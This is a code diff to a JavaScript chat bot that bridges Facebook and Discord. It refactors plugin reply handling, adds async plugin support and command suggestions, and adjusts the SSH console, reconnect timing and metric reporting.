-                                            "Detected not logged in. Throwing 7378278 to restarting..."
-                                          );
-                                          facebookloggedIn = false;
-                                          process.exit(7378278);
-                                        }
-                                      }
-                                    }, message.messageID, message.isGroup);
-                                    endTyping();
-                                  }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping,
-                                  message, log
-                                );
-                              }
-                            }
+                            return: returnFunc,
+                            resolvedLang: global.data.userLanguage[resolveID("Facebook", { msgdata: message })] || global.config.language,
+                            content: message.body
                           });
+                          if (global.getType(returndata) == "Promise") {
+                            returndata = await returndata;
+                          }
                         } catch (ex) {
                           log(
                             "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
@@ -2216,62 +1973,12 @@ if (global.config.enablefb) {
                           var stack = ex.stack.match(/[^\r\n]+/g);
                           returndata = {
                             handler: "internal",
-                            data: "plerr: " + stack.slice(0, 4)
+                            data: "plerr: " + stack.slice(0, 5)
                               .join("\r\n")
                           };
                         }
-                        if (typeof returndata == "object") {
-                          if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                            var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
-                              .isGroup);
-                            setTimeout(function (api, returndata, endTyping, message) {
-                              api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
-                                if (err) {
-                                  log("[Facebook] Errored while sending response:", err);
-                                  if (err.error == "Not logged in." && global.config
-                                    .facebookAutoRestartLoggedOut) {
-                                    log(
-                                      "[Facebook]",
-                                      "Detected not logged in. Throwing 7378278 to restarting..."
-                                    );
-                                    facebookloggedIn = false;
-                                    process.exit(7378278);
-                                  }
-                                }
-                              }, message.messageID, message.isGroup);
-                              endTyping();
-                            }, returndata.data.length * 30, api, returndata, endTyping, message);
-                          } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
-                            if (!returndata.data.body) {
-                              returndata.data.body = "";
-                            }
-                            returndata.data.body = prefix + " " + returndata.data.body;
-                            var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
-                              .isGroup);
-                            setTimeout(
-                              function (api, returndata, endTyping, message, log) {
-                                api.sendMessage(returndata.data, message.threadID, function (err) {
-                                  if (err) {
-                                    log("[Facebook] Errored while sending response:", err);
-                                    if (err.error == "Not logged in." && global.config
-                                      .facebookAutoRestartLoggedOut) {
-                                      log(
-                                        "[Facebook]",
-                                        "Detected not logged in. Throwing 7378278 to restarting..."
-                                      );
-                                      facebookloggedIn = false;
-                                      process.exit(7378278);
-                                    }
-                                  }
-                                }, message.messageID, message.isGroup);
-                                endTyping();
-                              }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
-                              log
-                            );
-                          }
-                        } else if (typeof returndata != "undefined") {
-                          log("[Facebook]", "Received an unknown response from plugin:", returndata);
-                        }
+                        returnFunc(returndata);
+
                         var endtime = Date.now();
                         var calctime = (endtime - starttime) / 1000;
                         if (calctime >= 10) {
@@ -2295,21 +2002,25 @@ if (global.config.enablefb) {
                     }
                   } else {
                     if (!global.config.hideUnknownCommandMessage) {
-                      api.sendMessage(prefix + " " + global.lang["UNKNOWN_CMD"].replace("{0}", global.config
-                        .commandPrefix), message.threadID, function (err) {
-                          if (err) {
-                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-                              facebookloggedIn = false;
-                              process.exit(7378278);
-                            }
-                          }
-                        }, message.messageID, message.isGroup);
+                      var nearest = require("./nearAPI.js").findBestMatch(
+                        arg[0].slice(global.config.commandPrefix.length),
+                        Object.keys(global.commandMapping)
+                          .filter(v => (admin || !global.commandMapping[v].adminCmd))
+                          .filter(v => ((global.commandMapping[v].compatibly & 1) || (global.commandMapping[v].compatibly == 0)))
+                      ).bestMatch;
+
+                      returnFunc({
+                        handler: "internal",
+                        data: getLang("UNKNOWN_CMD", "FB-" + message.senderID).replace("{0}", global.config.commandPrefix) +
+                          (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "FB-" + message.senderID)
+                            .replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')
+                            }` : "")
+                      });
                     }
                   }
                 } else {
                   var str = "";
-                  for (var n in message.attachments) {
+                  for (let n in message.attachments) {
                     var type = message.attachments[n].type;
                     type = type[0].toLocaleUpperCase() + type.substr(1);
                     str += "\r\n  <";
@@ -2346,9 +2057,9 @@ if (global.config.enablefb) {
                   );
                 }
               } else {
-                var str = "";
-                for (var n in message.attachments) {
-                  var type = message.attachments[n].type;
+                let str = "";
+                for (let n in message.attachments) {
+                  let type = message.attachments[n].type;
                   type = type[0].toLocaleUpperCase() + type.substr(1);
                   str += "\r\n  <";
                   str += type;
@@ -2356,7 +2067,8 @@ if (global.config.enablefb) {
                   switch (message.attachments[n].type) {
                     case "audio":
                     case "video":
-                      var dr = new Date(message.attachments[n].duration);
+                      // eslint-disable-next-line no-case-declarations
+                      let dr = new Date(message.attachments[n].duration);
                       str += dr.getUTCHours()
                         .pad(2) + ":" + dr.getUTCMinutes()
                           .pad(2) + ":" + dr.getUTCSeconds()
@@ -2388,28 +2100,17 @@ if (global.config.enablefb) {
               log("[Facebook]", message);
               try {
                 if (message.logMessageType == "log:subscribe") {
-                  var containBot = false;
                   var botID = api.getCurrentUserID();
-                  for (var n in message.logMessageData.addedParticipants) {
+                  for (let n in message.logMessageData.addedParticipants) {
                     if (message.logMessageData.addedParticipants[n].userFbId == botID) {
-                      containBot = true;
+                      returnFunc({
+                        handler: "internal",
+                        data: global.config.botname + " | Connected. \n" +
+                          getLang("CONNECTED_MESSAGE").replace("{0}", global.config.commandPrefix)
+                      });
+                      log("[Facebook]", message.author, "added Bot to", message.threadID);
+                      break;
                     }
-                  }
-                  if (containBot) {
-                    api.sendMessage(
-                      global.config.botname + " | Connected. \r\n" + global.lang.CONNECTED_MESSAGE
-                        .replace("{0}", global.config.commandPrefix), message.threadID,
-                      function (err) {
-                        if (err) {
-                          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-                            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-                            facebookloggedIn = false;
-                            process.exit(7378278);
-                          }
-                        }
-                      }, null, message.isGroup
-                    );
-                    log("[Facebook]", message.author, "added Bot to", message.threadID);
                   }
                 }
               } catch (ex) {
@@ -2417,7 +2118,7 @@ if (global.config.enablefb) {
               }
               break;
             case "message_reaction":
-              log("[Facebook]", message);
+              log("[Facebook] Reaction received:", message);
               break;
             case "message_unsend":
               log(
@@ -2434,8 +2135,8 @@ if (global.config.enablefb) {
                     fs.writeFileSync(
                       path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                       JSON.stringify(message, null, 4), {
-                        mode: 0o666
-                      }
+                      mode: 0o666
+                    }
                     );
                   }
                 }
@@ -2480,14 +2181,14 @@ if (global.config.enablefb) {
                   delete global.markAsReadFacebook[message.threadID];
                 }, 2000, message);
               }
-              var arg = message.body.replace((/”/g), "\"")
+              var argr = message.body.replace((/”/g), "\"")
                 .replace((/“/g), "\"")
                 .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                 .filter(function (el) {
                   return !(el == null || el == "" || el == " ");
                 });
-              arg.map(xy => xy.replace(/["]/g, ""));
-              if (arg.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
+              argr.map(xy => xy.replace(/["]/g, ""));
+              if (argr.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                 .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                 ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                   .senderID)))) {
@@ -2517,9 +2218,9 @@ if (global.config.enablefb) {
                 });
               }
               try {
-                var str = "";
-                for (var n in message.attachments) {
-                  var type = message.attachments[n].type;
+                let str = "";
+                for (let n in message.attachments) {
+                  let type = message.attachments[n].type;
                   type = type[0].toLocaleUpperCase() + type.substr(1);
                   str += "\r\n  <";
                   str += type;
@@ -2527,7 +2228,8 @@ if (global.config.enablefb) {
                   switch (message.attachments[n].type) {
                     case "audio":
                     case "video":
-                      var dr = new Date(message.attachments[n].duration);
+                      // eslint-disable-next-line no-case-declarations
+                      let dr = new Date(message.attachments[n].duration);
                       str += dr.getUTCHours()
                         .pad(2) + ":" + dr.getUTCMinutes()
                           .pad(2) + ":" + dr.getUTCSeconds()
@@ -2588,7 +2290,7 @@ if (global.config.enablefb) {
     updatePresence: false,
     autoMarkRead: false,
     autoMarkDelivery: false,
-    forceLogin: true
+    forceLogin: false
   };
   if (global.config.facebookProxy != null) {
     if (global.config.facebookProxyUseSOCKS) {
@@ -2603,7 +2305,7 @@ if (global.config.enablefb) {
     var _fbinstance = require("fca-unofficial")(fbloginobj, configobj, facebookcb);
     var forceReconnect = function forceReconnect(error) {
       if (!error) {
-        log("[Facebook]", "Destroying Facebook Chat instance and creating a new one... (~50 minutes clock)");
+        log("[Facebook]", "Destroying FCA instance and creating a new one...");
       }
       if (typeof facebook.listener == "object" && typeof facebook.listener.stopListening == "function") {
         facebook.listener.stopListening();
@@ -2621,7 +2323,6 @@ if (global.config.enablefb) {
       } catch (ex) { }
       _fbinstance = null;
       delete require.cache[require.resolve("fca-unofficial")];
-      delete require.cache[require.resolve("mqtt")];
       _fbinstance = require("fca-unofficial")({
         appState: temporaryAppState
       }, configobj, facebookcb);
@@ -2634,7 +2335,7 @@ if (global.config.enablefb) {
         }
       }, 30000);
     };
-    setInterval(forceReconnect, 2799999 + random(0, 1980000));
+    setInterval(forceReconnect, 64800000); //relogin every 18 hours
   } catch (ex) {
     log("[Facebook]", "Error found in codebase:", ex);
   }
@@ -2733,21 +2434,38 @@ if (global.config.enableSSHRemoteConsole) {
               prompt: ""
             });
             global.sshcurrsession[conninfo.ip + ":" + conninfo.port] = sshrl;
-            sshrl.on('line', (message) => {
-              log(
-                "[INTERNAL]", conninfo.ip + ":" + conninfo.port, "issued javascript code:",
-                message
-              );
-              try {
-                log("[SSH-JAVASCRIPT]", eval(message));
-              } catch (ex) {
-                log("[SSH-JAVASCRIPT]", ex);
-              }
-            });
+            sshrl.on('line', (message) => consoleHandle(message, conninfo.ip + ":" + conninfo.port));
             sshrl.setPrompt("ssh@c3c:js# ");
             sshrl.prompt();
             // process.stdout.pipe(stream, {end: false});
             // stream.pipe(process.stdin, {end: false});
+          });
+
+          session.on('pty', function (accept, _reject, info) {
+            log(
+              "[SSH]",
+              conninfo.ip + ":" + conninfo.port,
+              `requested PTY: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`,
+              Object.keys(info.modes).reduce((pv, cv) => {
+                if (info.modes[cv]) {
+                  if (pv == "") {
+                    return cv;
+                  }
+                  return `${pv}, ${cv}`;
+                }
+                return pv;
+              }, "")
+            );
+            accept();
+          });
+
+          session.on('window-change', function (accept, _reject, info) {
+            log("[SSH]", conninfo.ip + ":" + conninfo.port, `changed PTY size: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`);
+          });
+
+          session.on('signal', function (accept, _reject, info) {
+            accept();
+            process.emit(info.name);
           });
         });
       })
@@ -2772,6 +2490,13 @@ if (global.config.enableSSHRemoteConsole) {
     });
 }
 typeof global.data.cacheName != "object" ? global.data.cacheName = {} : "";
+if (typeof global.data.cacheNameExpires != "object") {
+  global.data.cacheNameExpires = {};
+  var currTime = Date.now();
+  for (var n in global.data.cacheName) {
+    global.data.cacheNameExpires[n] = currTime + 604800000; //cacheName expires in 7 days.
+  }
+}
 typeof global.data.everyoneTagBlacklist != "object" ? global.data.everyoneTagBlacklist = {} : "";
 var discordid = "Disabled";
 if (global.config.enablediscord) {
@@ -2787,49 +2512,80 @@ if (global.config.enablediscord) {
     log("[Discord]", "Crashed with error: ", error);
     log("[Discord]", "Trying to reconnect... Some plugins might not work correctly.");
   });
-  var discordMessageHandler = function (message) {
+  var discordMessageHandler = async function (message) {
     var nointernalresolve = false;
     var receivetime = new Date();
+
+    let returnFunc = async function returnFunc(returndata) {
+      if (typeof returndata == "object") {
+        switch (returndata.handler) {
+          case "internal":
+            if (typeof returndata.data != "string") return { error: "Data must be a string." };
+            try {
+              return message.reply((returndata.data || "\u200B"), {
+                split: true
+              });
+            } catch (ex) {
+              return {
+                error: ex
+              };
+            }
+          case "internal-raw":
+            if (global.getType(returndata.data) != "Object") return { error: "Data must be an object." };
+            var body = returndata.data.body || "\u200B";
+            delete returndata.data.body;
+            returndata.data.split = true;
+            try {
+              return message.reply(body, returndata.data);
+            } catch (ex) {
+              return {
+                err: ex
+              };
+            }
+          default:
+            return {
+              error: `Invalid handler: ${returndata.handler}`
+            };
+        }
+      } else if (typeof returndata != "undefined") {
+        log("[Discord]", "Received an unknown response from plugin:", returndata);
+      }
+    };
+
     for (var n in global.chatHook) {
       if (global.chatHook[n].listenplatform & 2) {
         var chhandling = global.chatHook[n];
         if (chhandling.listentype == "everything") {
-          var admin = false;
+          let admin = false;
           if (global.config.admins.indexOf("DC-" + message.author.id) != -1) {
             admin = true;
           }
-          if (typeof chhandling.resolverFunc == "function" && chhandling.resolverFunc("Discord", {
-            time: receivetime,
-            msgdata: message,
-            discordapi: client,
-            // eslint-disable-next-line no-nested-ternary
-            facebookapi: (typeof facebook == "object" ? (typeof facebook.api == "object" ? facebook
-              .api : {}) : {}),
-            prefix: prefix,
-            admin: admin,
-            // eslint-disable-next-line no-loop-func
-            log: function logPlugin(...message) {
-              log.apply(global, [
-                "[PLUGIN]",
-                "[" + String(chhandling.handler) + "]"
-              ].concat(message));
-            },
-            // eslint-disable-next-line no-loop-func
-            return: function returndata(returndata) {
-              if (!returndata) return;
-              if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                message.reply((returndata.data || ""), {
-                  split: true
-                });
-              } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
-                var body = returndata.data.body || "";
-                delete returndata.data.body;
-                returndata.data.split = true;
-                message.reply(body, returndata.data);
-              }
-            }
-          }) === true) {
-            nointernalresolve = true;
+          if (
+            global.getType(chhandling.resolverFunc) == "Function" ||
+            global.getType(chhandling.resolverFunc) == "AsyncFunction"
+          ) {
+            let chdata = chhandling.resolverFunc("Discord", {
+              time: receivetime,
+              msgdata: message,
+              discordapi: client,
+              // eslint-disable-next-line no-nested-ternary
+              facebookapi: (typeof facebook == "object" ? (typeof facebook.api == "object" ? facebook
+                .api : {}) : {}),
+              prefix: prefix,
+              admin: admin,
+              // eslint-disable-next-line no-loop-func
+              log: function logPlugin(...message) {
+                log.apply(global, [
+                  "[PLUGIN]",
+                  "[" + String(chhandling.handler) + "]"
+                ].concat(message));
+              },
+              return: returnFunc,
+              resolvedLang: global.data.userLanguage[resolveID("Discord", { msgdata: message })] || global.config.language
+            });
+            // eslint-disable-next-line no-await-in-loop
+            if (global.getType(chdata) == "Promise") chdata = await chdata;
+            nointernalresolve = (nointernalresolve || chdata === true);
           }
         }
       }
@@ -2848,30 +2604,32 @@ if (global.config.enablediscord) {
           (message.attachments.size > 0 ? message.attachments : "")
         );
         var currenttime = new Date();
-        var arg = message.content.replace((/”/g), "\"")
+        let arg = message.content.replace((/”/g), "\"")
           .replace((/“/g), "\"")
           .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
           .filter(function (el) {
             return !(el == null || el == "" || el == " ");
           })
           .map(xy => xy.replace(/"/g, ""));
+
+        let admin = false;
+        for (var no in global.config.admins) {
+          if (global.config.admins[no] == "DC-" + message.author.id) {
+            admin = true;
+          }
+        }
         if (global.commandMapping[arg[0].substr(1)]) {
           if (!(global.commandMapping[arg[0].substr(1)].compatibly & 2) && global.commandMapping[arg[0].substr(1)]
             .compatibly != 0) {
-            message.reply(global.lang["UNSUPPORTED_INTERFACE"]);
+            message.reply(getLang("UNSUPPORTED_INTERFACE", "DC-" + message.author.id));
           } else {
-            var admin = false;
-            for (var no in global.config.admins) {
-              if (global.config.admins[no] == "DC-" + message.author.id) {
-                admin = true;
-              }
-            }
             global.data.cacheName["DC-" + message.author.id] = message.author.tag;
             var mentions = {};
             message.mentions.users.forEach(function (y, x) {
               mentions["DC-" + x] = y;
               global.data.cacheName["DC-" + x] = y.username + "#" + y.discrimator;
             });
+            var returndata = {};
             try {
               if (facebook) {
                 if (!facebook.api) {
@@ -2881,7 +2639,7 @@ if (global.config.enablediscord) {
                 facebook = {};
                 facebook.api = {};
               }
-              var returndata = global.commandMapping[arg[0].substr(1)].scope("Discord", {
+              returndata = global.commandMapping[arg[0].substr(1)].scope("Discord", {
                 args: JSON.parse(JSON.stringify(arg)),
                 time: currenttime,
                 msgdata: message,
@@ -2896,45 +2654,29 @@ if (global.config.enablediscord) {
                     "[" + global.commandMapping[arg[0].substr(1)].handler + "]"
                   ].concat(message));
                 },
-                return: function returndata(returndata) {
-                  if (!returndata) return;
-                  if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                    message.reply((returndata.data || ""), {
-                      split: true
-                    });
-                  } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
-                    var body = returndata.data.body || "";
-                    delete returndata.data.body;
-                    returndata.data.split = true;
-                    message.reply(body, returndata.data);
-                  }
-                }
+                return: returnFunc,
+                resolvedLang: global.data.userLanguage[resolveID("Discord", { msgdata: message })] || global.config.language,
+                content: message.content
               });
+              if (global.getType(returndata) == "Promise") returndata = await returndata;
             } catch (ex) {
               log("[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:", ex);
-              var returndata = {
+              returndata = {
                 handler: "internal",
                 data: "plerr: " + ex.stack
               };
             }
-            if (typeof returndata == "object") {
-              if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                message.reply((returndata.data || ""), {
-                  split: true
-                });
-              } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
-                var body = returndata.data.body || "";
-                delete returndata.data.body;
-                returndata.data.split = true;
-                message.reply(body, returndata.data);
-              }
-            } else if (typeof returndata != "undefined") {
-              log("[Facebook]", "Received an unknown response from plugin:", returndata);
-            }
+            returnFunc(returndata);
           }
         } else {
           if (!global.config.hideUnknownCommandMessage) {
-            message.reply(global.lang["UNKNOWN_CMD"].replace("{0}", global.config.commandPrefix));
+            var nearest = require("./nearAPI.js").findBestMatch(
+              arg[0].slice(global.config.commandPrefix.length),
+              Object.keys(global.commandMapping)
+                .filter(v => (admin || !global.commandMapping[v].adminCmd))
+                .filter(v => ((global.commandMapping[v].compatibly & 2) || (global.commandMapping[v].compatibly == 0)))
+            ).bestMatch;
+            message.reply(getLang("UNKNOWN_CMD", "DC-" + message.author.id).replace("{0}", global.config.commandPrefix) + (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "DC-" + message.author.id).replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')}` : ""));
           }
         }
       } else {
@@ -3061,7 +2803,9 @@ if (global.config.enableMetric) {
       botname: global.config.botname,
       prefix: global.config.commandPrefix,
       osname: osName,
-      desc: "No description.",
+      desc: fs.readFileSync(path.join(__dirname, "bot_description.txt"), {
+        encoding: "utf8"
+      }),
       admin: JSON.stringify(global.config.admins)
     };
     if (global.config.metricHideBotAccountLink) {
@@ -3072,7 +2816,7 @@ if (global.config.enableMetric) {
       send.herokuapp = global.config.herokuApplication;
     }
     return func(send);
-  }
+  };
 
   var metricNewLogic = function metricNewLogic() {
     log("[Metric]", "Generating new Metric ID...");
